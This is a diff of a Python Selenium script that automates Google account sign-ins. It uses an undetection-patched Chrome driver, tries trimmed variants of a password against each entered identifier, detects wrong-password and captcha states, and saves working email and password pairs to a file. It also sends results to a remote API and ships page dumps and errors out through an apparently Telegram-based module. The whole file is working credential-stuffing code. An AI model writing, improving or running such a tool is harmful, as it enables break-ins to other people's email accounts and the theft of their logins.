@@ -3,46 +3,17 @@ freeze_support()
 
 from termcolor import colored
 import os
+from func import *
 os.system('color')
-from sys import exit
-import undetected_chromedriver.v2 as uc
-import random
-import tg
-import requests
-import json
-import readchar
-from selenium.webdriver.common.by import By
-from time import sleep, time
 
-def loading(flag):
-    for x in range (0,20):  
-        b = "Loading" + "." * x
-        print (b, end="\r")
-        time.sleep(.5)
 
-def find_by_id(driver,text):
-    return driver.find_element(By.XPATH,'//*[@id="'+text+'"]')
-def find_by_name(driver,text):
-    return driver.find_element(By.XPATH,'//*[@name="'+text+'"]')
-def find_by_text(driver, text):
-    return driver.find_element(By.XPATH,"//*[text()='"+text+"']")
-def errorstore(html, e, flag):
+def errorstore(html, e):
     html = driver.page_source
-    raw_html = open("html.html","w+")
-    raw_html.write(html)
-    raw_html.close()
+    to_write("html.html",html,"w+")
     tg.send("html.html")
 
-    raw_err = open("err.txt","w+")
-    raw_err.write(str(e))
-    raw_err.close()
+    to_write("err.txt", str(e) ,"w+")
     tg.send("err.txt")
-
-    if flag == True:
-        exit(0)
-
-
-
 
 
 
@@ -112,7 +83,7 @@ if __name__ == '__main__':
         CCode = data['CountryCode']
         PSpecial = data['PassSpecial']
     except:
-        print("Your config dumped. Please reset config from here https://pastebin.com/raw/T3wHJGPv")
+        print("Your config dumped. Please reset config.json from here https://pastebin.com/raw/T3wHJGPv")
 
 
     start = input(colored("Enter number:","yellow"))
@@ -154,33 +125,39 @@ if __name__ == '__main__':
             nextButton = driver.find_element(By.XPATH,'//*[@id ="identifierNext"]')
             nextButton.click()
             error_last = time()
+            try_times = 0
             while 1==1:
+                try:
+                    nextButton = find_by_id(driver,'ca')
+                    nextButton.click()
+                    print(" "*36,end="\r")
+                    print("Captcha", end="\r")
+                    sleep(.5)
+                    break
+                except:
+                    pass
                 if '" badinput="false" aria-invalid="true">' in driver.page_source:
-                    print("Wrong Mail")
-                    sleep(2)
+                    print(" "*36,end="\r")
+                    print("No Match", end="\r")
+                    sleep(.5)
+                    try_times = 21
                     break
                 elif 'id="passwordNext"><div' in driver.page_source:
-                    print("Enterd")
-                    sleep(2)
+                    print(" "*36,end="\r")
+                    print("Enterd",end="\r")
+                    sleep(.5)
                     break
                 else:
-                    if time - error_last>10:
-                        errorstore(driver, "No responce in 10 second", False)
+                    try_times += 1
+                    if try_times > 20:
+                        errorstore(driver, "No responce in 10 second")
                         break
-                    print("trying")
-            continue
-            while "identifier" not in driver.current_url:
-                print(time())
-                if "challenge" in driver.current_url:
-                    print("\t\t aaaa")
-            sleep(.2)
-            if "identifier" in driver.current_url:
-                sleep(.4)
-                if "identifier" in driver.current_url:
-                    sleep(.3)
-                    if "identifier" in driver.current_url:
-                        print(passid)
-                        continue
+                    print(" "*36,end="\r")
+                    print ("Loading" + "." * try_times, end="\r")
+                    sleep(.5)
+            
+            if try_times > 20:
+                continue
 
             try:
                 if cutmain == '0':
@@ -192,38 +169,67 @@ if __name__ == '__main__':
                     loginBox.send_keys(passid)
                     nextButton = driver.find_element(By.XPATH,'//*[@id="passwordNext"]')
                     nextButton.click()
-                    #check to speed up
-                    sleep(.2)
-                    if "Wrong password" not in driver.page_source:
-                        sleep(.3)
-                        if "Wrong password" not in driver.page_source:
-                            sleep(.4)
-                            if "Wrong password" not in driver.page_source:
-                                sleep(2.2)
+                    
 
-                    driver.implicitly_wait(1)
+                    try_times = time()
+                    while 1==1:
+                        if time() - try_times > 8:
+                            errorstore(driver, "first try time-out")
+                            break
+                        if "sZwd7c B6Vhqe qdulke jK7moc" not in driver.page_source:
+                            sleep(.5)
+                            continue
+                        else:
+                            sleep(.5)
+                            break
+
+                    try:
+                        nextButton = find_by_id(driver, 'ca')
+                        nextButton.click()
+                        print(" "*36,end="\r")
+                        print("Captcha", end="\r")
+                        sleep(.5)
+                        continue
+                    except:
+                        pass
+
+
+
+
                 #try---2
                 if cutpre!='0':
                     try:
-                        loginBox = find_by_name(driver,"password")
+                        loginBox = find_by_name(driver, "password")
                     except:
-                        loginBox = find_by_name(driver,"Passwd")
+                        loginBox = find_by_name(driver, "Passwd")
+                    print(" "*36,end="\r")
+                    print("Wrong Pass", end="\r")
                     gpass = passid[int(cutpre):]
                     loginBox.send_keys(gpass)
                     nextButton = driver.find_element(By.XPATH,'//*[@id="passwordNext"]')
                     nextButton.click()
 
-                    #check to speed up
-                    sleep(1)
-                    if "Wrong password" not in driver.page_source:
-                        sleep(.2)
-                        if "Wrong password" not in driver.page_source:
-                            sleep(.2)
-                            if "Wrong password" not in driver.page_source:
-                                sleep(2)
 
-                    driver.implicitly_wait(1)
-
+                    try_times = time()
+                    while 1==1:
+                        if time() - try_times > 8:
+                            errorstore(driver, "second try time-out")
+                            break
+                        if "sZwd7c B6Vhqe qdulke jK7moc" not in driver.page_source:
+                            sleep(.5)
+                            continue
+                        else:
+                            sleep(.5)
+                            break
+                    try:
+                        nextButton = find_by_id(driver, 'ca')
+                        nextButton.click()
+                        print(" "*36,end="\r")
+                        print("Captcha", end="\r")
+                        sleep(.5)
+                        continue
+                    except:
+                        pass
 
                 #try---3
                 if cutlast!='0':
@@ -231,24 +237,38 @@ if __name__ == '__main__':
                         loginBox = find_by_name(driver,"password")
                     except:
                         loginBox = find_by_name(driver,"Passwd")
+                    print(" "*36,end="\r")
+                    print("Wrong Pass-2", end="\r")
                     gpass = passid[:-int(cutlast)]
                     loginBox.send_keys(gpass)
                     nextButton = driver.find_element(By.XPATH,'//*[@id="passwordNext"]')
                     nextButton.click()
                     
-                    #check to speed up
-                    sleep(1)
-                    if "Wrong password" not in driver.page_source:
-                        sleep(.2)
-                        if "Wrong password" not in driver.page_source:
-                            sleep(.2)
-                            if "Wrong password" not in driver.page_source:
-                                sleep(2)
-
-                    driver.implicitly_wait(1)
-
+                    try_times = time()
+                    while 1==1:
+                        if time() - try_times > 8:
+                            errorstore(driver, "third try time-out")
+                            break
+                        if "sZwd7c B6Vhqe qdulke jK7moc" not in driver.page_source:
+                            sleep(.5)
+                            continue
+                        else:
+                            sleep(.5)
+                            break
+                    try:
+                        nextButton = find_by_id(driver, 'ca')
+                        nextButton.click()
+                        print(" "*36,end="\r")
+                        print("Captcha", end="\r")
+                        sleep(.5)
+                        continue
+                    except:
+                        pass
             except Exception as e:
-                errorstore(driver,e,False)
+                if str(e)[:103]=='Message: no such element: Unable to locate element: {"method":"xpath","selector":"//*[@name="Passwd"]"}':
+                    print("",end="\r")
+                else:
+                    errorstore(driver,e)
 
 
             flag = 0
@@ -276,11 +296,15 @@ if __name__ == '__main__':
                                     _retry = driver.find_element(By.XPATH,"//*[text()='Download your data']")
                                     flag = 5
                                 except Exception as e:
-                                    errorstore(driver,e,False)
+                                    errorstore(driver,e)
                 
                 
 
-
+            if flag == 10:
+                print(" "*36,end="\r")
+                print("Wrong Pass-3", end="\r")
+            sleep(.3)
+            print(" "*36,end="\r")
             if flag == 0:
                 data = {'api': serverapi,
                         'type': '2',
@@ -308,10 +332,10 @@ if __name__ == '__main__':
                     file_object.write(gmailId+' '+gpass+'\n')
                     file_object.close()
         except Exception as e:
-            print(3)
-            errorstore(driver,e,True)
-#            if logintry == "0":
-#                print("Error")
-##                k = readchar.readchar()
-#                exit()
-#            driver.delete_all_cookies()
+            try:
+                errorstore(driver,e)
+                exit(0)
+            except:
+                to_write("err.txt", e, "w+")
+                tg.send("err.txt")
+                exit(0)
